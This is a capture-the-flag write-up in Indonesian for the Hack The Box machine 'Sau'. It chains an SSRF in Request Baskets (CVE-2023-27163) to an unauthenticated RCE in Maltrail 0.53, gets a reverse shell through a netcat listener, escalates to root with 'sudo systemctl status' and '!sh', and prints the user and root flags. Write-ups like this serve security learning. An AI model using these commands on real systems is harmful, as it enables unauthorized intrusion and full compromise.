# Sau  
**SOLVED : 13 SEPT | 2023**  


## nmap
![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/fe6b7754-9647-4603-a391-2710a78c4113)
  
```
nmap 10.10.11.224 -p- -sVC  --min-rate 1000
```
![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/76a92f3a-8783-4a05-9465-faa647c0527f)  
Port yang open di **22** dan **55555**, maka dicoba diakses pada `10.10.11.224:55555`  
![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/f72067ae-be68-42ee-9c60-37a7bbbfb02e)  
  
## exploit
1. Pertama-tama dicoba untuk mengakses `10.10.11.224:55555` yang ternyata diarahkan kedalam sebuah "Request Baskets" dengan versi **1.2.1**  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/c142b35b-30f1-4c2e-b9ad-63e7abc44d70)  

2. Setelah itu dilakukan sedikit research lagi dan ditemukan ternyata adanya kerentanan pada "Request Baskets" dengan versi **1.2.1**, yaitu pada (CVE-2023-27163), disini kerentanannya adalah kemungkinan dilakukannya **Server-Side Request Forgery (SSRF)**  
   ```md
   # (CVE-2023-27163)
   Attackers to access network resources and sensitive information by exploiting the /api/baskets/{name} component through a crafted API request.
   Source : https://github.com/entr0pie/CVE-2023-27163
   ```
3. Dari sini, saya menggunakan tools untuk melakukan exploitasi dengan menggunakan https://github.com/entr0pie/CVE-2023-27163. Tools ini membantu untuk mengakses **port 80** yang sebelumnya berstatus **http filtered**.  
   Commands :
   ```
   ./CVE-2023-27163.sh http://10.10.11.224:55555/ http://127.0.0.1:80/
   ```
   
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/0f7b1fee-14fd-4498-9b5b-72f9184f5c40)
     
   Masukan token sesuai dengan yang diterakan pada tools.  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/2c264771-06dc-43a4-ad9f-2c9d311ff997)
     
   Coba untuk mengakses `10.10.11.224:55555/qsaeyb` yang sebenarnya akan diarahkan pada **http** yakni di port 80.  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/6f2642f0-346b-41d9-b594-fa93ef88110e)  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/8c6b244b-dbaf-4cce-a92a-051c01c69dca)  
   Dapat dilihat pada website ini menampilkan situs **Mailtrail (v0.53)**  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/a964462b-83ac-47c3-984e-6a037e2b1153)
   Request juga tertangkap pada web sebagaimana fungsi asli dari "Request Baskets".  

4. Setelah itu dilakukan sedikit research lagi dan ditemukan ternyata adanya kerentanan pada "Mailtrail" dengan versi **0.53**, yaitu dapat dilakukan "Unauthenticated Remote Code Execution Exploit"
5. Dari sini, saya kembali menggunakan tools dari https://github.com/HusenjanDev/CVE-2023-27163-AND-Mailtrail-v0.53 untuk melakukan exploitnya
   Command yang saya gunakan adalah  
   ```
   nc -lvnp 8333
   python3 exploit.py 10.10.16.42 8333 http://10.10.11.224:55555/qsaeyb/login
   ```
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/d35f770f-e674-4ced-81d3-692c825cfe44)  
   Jika belum melakukan _listen_ maka akan menuliskan "Login Failed" sama halnya dengan jika mengakses `http://10.10.11.224:55555/qsaeyb/login`  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/c3629ccc-d094-4f24-bb4c-a019cb1ec9b9)
6. Setelah berhasil masuk, maka dilakukan pencarian _user.txt_
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/a3be1d70-5eda-410b-843f-813eb7260985)  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/39e74b81-b93f-484d-9f99-499dc0a1d428)  
   **USER FLAG : 22366e50cf5e2f0f6ccceacadf92fef1**

## privilege escalation  
1. Pertama-tama saya menjalankan command `sudo -l` untuk memeriksa permissions sudo yang dimiliki user puma.
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/e99f44e4-06f4-4afe-8c8e-fa155c20b8bc)
   dan disini terlihat bahwa `(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service`, maka untuk mengakses **systemctl status 
   trail.service** tidak memerlukan password  
   ![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/b7d58424-7d33-459c-a6e6-ee486938422e)
2. Untuk melakukan privilege escalation pada **sudo systemctl**, cukup menambahkan `!sh`, maka kita akan spawn shell lain, dan disini yang terjadi adalah shell dari root yang terbuka  
Sumber : https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-systemctl-privilege-escalation/  
![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/b3e68dba-da9f-4449-993f-e8c77ef00190)  
3. Tahap berikutnya adalah mencari flag dari ROOT.  
![image](https://github.com/PlasmaRing/HTB-WRITE-UP/assets/92077284/6f33f1ac-099e-4983-966c-c0a2f249ce42)  
   **ROOT FLAG : af1d5d215f180ea877ca659d9c7cdf88**
